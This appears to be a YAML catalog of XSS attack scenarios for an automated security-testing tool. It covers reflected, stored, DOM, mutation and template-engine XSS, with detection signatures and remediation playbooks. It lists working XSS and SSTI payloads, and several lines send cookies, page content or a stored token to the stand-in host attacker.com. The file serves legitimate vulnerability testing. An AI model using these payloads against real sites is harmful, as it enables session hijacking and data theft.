@@ -1,0 +1,222 @@
+# XSS Attack Scenarios
+
+scenarios:
+  - id: xss-reflected-basic
+    name: "Reflected XSS - Basic"
+    category: injection
+    subcategory: xss
+    severity: high
+    cwe: "CWE-79"
+    owasp: "A03:2021"
+    description: "Reflect user input in response without proper encoding"
+    prerequisites:
+      - "Parameter reflected in HTML response"
+      - "No CSP or weak CSP"
+      - "No output encoding"
+    attack_steps:
+      - step: 1
+        action: "find_reflection"
+        description: "Find parameters reflected in response"
+        tool: "fuzz_params"
+        payloads:
+          - "<test>"
+          - "test<tag>"
+          - "'\"><test>"
+      - step: 2
+        action: "confirm_execution"
+        description: "Confirm JavaScript execution"
+        tool: "http_request"
+        payloads:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+          - "javascript:alert(1)"
+      - step: 3
+        action: "exfiltrate_data"
+        description: "Demonstrate impact with data exfiltration"
+        tool: "http_request"
+        payloads:
+          - "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
+          - "<script>fetch('https://attacker.com/?d='+document.body.innerHTML)</script>"
+    detection_signatures:
+      - "Unencoded user input in HTML response"
+      - "Script tags or event handlers in response"
+      - "CSP does not block inline scripts"
+    verification:
+      - "Browser executes payload in victim context"
+      - "Check CSP headers"
+    remediation_playbook: "fix-xss-output-encoding"
+    tags: ["reflected", "basic", "script-tag"]
+
+  - id: xss-stored-comment
+    name: "Stored XSS - Comment/Post"
+    category: injection
+    subcategory: xss
+    severity: critical
+    cwe: "CWE-79"
+    owasp: "A03:2021"
+    description: "Persistent XSS via stored user content (comments, posts, profiles)"
+    prerequisites:
+      - "User content stored and displayed to others"
+      - "Rich text or HTML allowed"
+      - "Insufficient sanitization"
+    attack_steps:
+      - step: 1
+        action: "inject_payload"
+        description: "Submit malicious content via normal UI"
+        tool: "browser_action"
+        actions:
+          - "navigate to /posts/new"
+          - "fill content with payload"
+          - "submit form"
+        payloads:
+          - "<script>alert('Stored XSS')</script>"
+          - "<img src=x onerror=stealSession()>"
+          - "<iframe src=javascript:stealToken()>"
+      - step: 2
+        action: "verify_persistence"
+        description: "Confirm payload stored and executes on view"
+        tool: "browser_action"
+        actions:
+          - "navigate to /posts/1"
+          - "verify script executes"
+      - step: 3
+        action: "demonstrate_impact"
+        description: "Show real-world impact (session theft, defacement)"
+        tool: "browser_action"
+        payloads:
+          - "document.location='https://attacker.com/?cookie='+document.cookie"
+          - "new Image().src='https://attacker.com/?token='+localStorage.getItem('token')"
+    detection_signatures:
+      - "Script content in database"
+      - "Script executes when viewing stored content"
+      - "Affects multiple users"
+    verification:
+      - "View stored content in browser, confirm execution"
+      - "Check database for unsanitized content"
+    remediation_playbook: "fix-xss-stored-sanitization"
+    tags: ["stored", "persistent", "high-impact"]
+
+  - id: xss-dom-based
+    name: "DOM-based XSS"
+    category: injection
+    subcategory: xss
+    severity: high
+    cwe: "CWE-79"
+    owasp: "A03:2021"
+    description: "XSS via client-side DOM manipulation (no server reflection)"
+    prerequisites:
+      - "Client-side JavaScript reads URL/hash/fragment"
+      - "Data written to DOM via unsafe sinks"
+      - "No sanitization before DOM write"
+    attack_steps:
+      - step: 1
+        action: "identify_sources"
+        description: "Find DOM sources (location.hash, search, URL params)"
+        tool: "code_scan"
+        patterns:
+          - "location\.hash"
+          - "location\.search"
+          - "document\.URL"
+          - "window\.name"
+          - "document\.referrer"
+      - step: 2
+        action: "identify_sinks"
+        description: "Find unsafe DOM sinks"
+        tool: "code_scan"
+        patterns:
+          - "innerHTML\s*="
+          - "outerHTML\s*="
+          - "document\.write"
+          - "eval\s*\("
+          - "setTimeout\s*\("
+          - "setInterval\s*\("
+          - "\.html\s*\("
+          - "dangerouslySetInnerHTML"
+      - step: 3
+        action: "craft_exploit_url"
+        description: "Create URL with payload in source"
+        tool: "http_request"
+        payloads:
+          - "#<img src=x onerror=alert(1)>"
+          - "?search=<svg onload=alert(1)>"
+          - "#javascript:alert(1)"
+    detection_signatures:
+      - "Source-to-sink path in client code"
+      - "Payload executes without server request"
+      - "Vulnerable in static analysis"
+    verification:
+      - "Open crafted URL in browser"
+      - "Check JavaScript console for execution"
+    remediation_playbook: "fix-xss-dom-sanitization"
+    tags: ["dom", "client-side", "no-server-request"]
+
+  - id: xss-mutation
+    name: "Mutation XSS (mXSS)"
+    category: injection
+    subcategory: xss
+    severity: high
+    cwe: "CWE-79"
+    owasp: "A03:2021"
+    description: "XSS via browser's HTML parser mutations"
+    prerequisites:
+      - "Content sanitized but parser mutates it"
+      - "InnerHTML/outerHTML used after sanitization"
+    attack_steps:
+      - step: 1
+        action: "test_mutations"
+        description: "Test payloads that mutate during parsing"
+        tool: "browser_action"
+        payloads:
+          - "<svg><p><style><img src=</style><img src=x onerror=alert(1)>"
+          - "<math><mtext><table><mglyph><svg><mtext><img src=x onerror=alert(1)>"
+          - "<noscript><p><title></noscript><img src=x onerror=alert(1)>"
+    detection_signatures:
+      - "Sanitized payload becomes executable after DOM insertion"
+      - "Browser parser behavior differs from sanitizer"
+    verification:
+      - "Apply sanitizer, insert via innerHTML, confirm execution"
+    remediation_playbook: "fix-xss-mutation-safe-sinks"
+    tags: ["mutation", "mxss", "parser-differential"]
+
+  - id: xss-template
+    name: "Template Engine XSS"
+    category: injection
+    subcategory: xss
+    severity: critical
+    cwe: "CWE-79"
+    owasp: "A03:2021"
+    description: "XSS via server-side template injection (SSTI -> XSS)"
+    prerequisites:
+      - "Template engine used (Jinja2, Twig, Freemarker, Velocity, Handlebars)"
+      - "User input passed to template"
+      - "Autoescape disabled or bypassed"
+    attack_steps:
+      - step: 1
+        action: "identify_template_usage"
+        description: "Find template rendering with user input"
+        tool: "code_scan"
+        patterns:
+          - "render_template_string"
+          - "Template\s*\("
+          - "jinja2\.Environment.*autoescape\s*=\s*False"
+          - "twig.*render"
+          - "freemarker.*process"
+      - step: 2
+        action: "inject_template_payload"
+        description: "Inject template syntax for XSS"
+        tool: "http_request"
+        payloads:
+          - "{{7*7}}"  # Test template execution
+          - "{{config}}"  # Leak config
+          - "{{''.__class__.__mro__[1].__subclasses__()}}"  # Python SSTI
+          - "<script>alert(1)</script>"  # Direct XSS if autoescape off
+    detection_signatures:
+      - "Template syntax executed"
+      - "Server-side code execution possible"
+      - "Autoescape bypassed"
+    verification:
+      - "Template payload renders as HTML/JS"
+      - "Check template engine configuration"
+    remediation_playbook: "fix-xss-template-autoescape"
+    tags: ["template", "ssti", "server-side"]
